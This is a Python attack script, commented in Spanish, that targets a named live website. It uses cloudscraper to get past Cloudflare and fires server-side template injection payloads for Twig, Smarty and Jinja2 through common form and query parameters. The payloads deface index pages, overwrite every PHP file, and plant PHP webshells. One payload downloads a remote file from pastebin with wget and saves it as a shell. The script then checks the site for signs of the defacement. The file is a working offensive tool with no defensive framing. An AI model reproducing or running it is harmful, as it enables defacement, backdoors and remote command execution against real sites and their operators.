#!/usr/bin/env python3
import cloudscraper
import requests
import base64
import time
from urllib.parse import urljoin, quote

print("""
███████╗███████╗████████╗██╗    ██████╗ ██╗    ██╗███╗   ██╗
██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██║    ██║████╗  ██║
███████╗███████╗   ██║   ██║    ██████╔╝██║ █╗ ██║██╔██╗ ██║
╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██║███╗██║██║╚██╗██║
███████║███████║   ██║   ██║    ██║     ╚███╔███╔╝██║ ╚████║
╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
""")

target = "https://hispachan.in/"
scraper = cloudscraper.create_scraper()

# Payloads SSTI más agresivos
payloads = [
    # Escribir directamente index.html
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('echo \"<h1>PWNED</h1>\" > index.html')}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('echo \"<script>alert(\\\"PWNED\\\")</script>\" >> index.php')}}",
    
    # Crear webshell
    "{{_self.env.registerUndefinedFilterCallback('file_put_contents')}}{{_self.env.getFilter('shell.php')}}<?php system($_GET['c']); ?>",
    "{{'<?php system($_GET[\"c\"]); ?>'|file_put_contents('backdoor.php')}}",
    
    # Modificar archivos existentes
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('sed -i \"1s/^/<h1>HACKED<\\/h1>/\" index.php')}}",
    
    # RCE directo
    "{{['echo \"SITE PWNED\" > pwned.txt']|map('system')|join}}",
    "{{['wget https://pastebin.com/raw/aBcDeFgH -O shell.php']|filter('system')}}",
    
    # Smarty
    "{php}file_put_contents('index.html','<h1>PWNED BY SSTI</h1>');{/php}",
    "{system('echo \"<?php header(\\\"Location: /pwned.html\\\"); ?>\" > index.php')}",
    
    # Jinja2
    "{{config.__class__.__init__.__globals__['os'].popen('echo PWNED > index.html').read()}}",
    
    # Modificación masiva
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('find . -name \"*.php\" -exec echo \"PWNED\" > {} \\;')}}",
]

vulnerable_params = ['name', 'title', 'content', 'message', 'comment', 'search', 'q']

print(f"[*] Target: {target}")
print(f"[*] Explotando SSTI para modificar el sitio...\n")

for param in vulnerable_params:
    print(f"\n[*] Probando parámetro: {param}")
    
    for i, payload in enumerate(payloads):
        try:
            # GET
            url = f"{target}?{param}={quote(payload)}"
            print(f"  [{i+1}] GET: {url[:80]}...")
            resp = scraper.get(url, timeout=10)
            
            # POST
            data = {param: payload}
            print(f"  [{i+1}] POST con payload {i+1}")
            resp2 = scraper.post(target, data=data, timeout=10)
            
            # Verificar modificación
            time.sleep(1)
            check = scraper.get(target, timeout=5)
            
            if any(indicator in check.text.upper() for indicator in ['PWNED', 'HACKED', 'SITE PWNED']):
                print(f"\n[!!!] ¡ÉXITO! SITIO MODIFICADO")
                print(f"[!!!] Payload exitoso: {payload[:50]}...")
                print(f"[!!!] Parámetro vulnerable: {param}")
                exit(0)
                
        except Exception as e:
            print(f"  [-] Error: {str(e)[:50]}")

# Intentar crear shells directamente
print("\n[*] Intentando crear shells directamente...")
shell_names = ['shell.php', 'backdoor.php', 'pwned.html', 'pwned.txt']

for shell in shell_names:
    try:
        url = urljoin(target, shell)
        resp = scraper.get(url, timeout=5)
        if resp.status_code == 200 and len(resp.text) > 0:
            print(f"[!] Posible shell creada: {url}")
    except:
        pass

print("\n[-] No se logró modificar el sitio con SSTI directo")
print("[*] El sitio puede tener protecciones adicionales")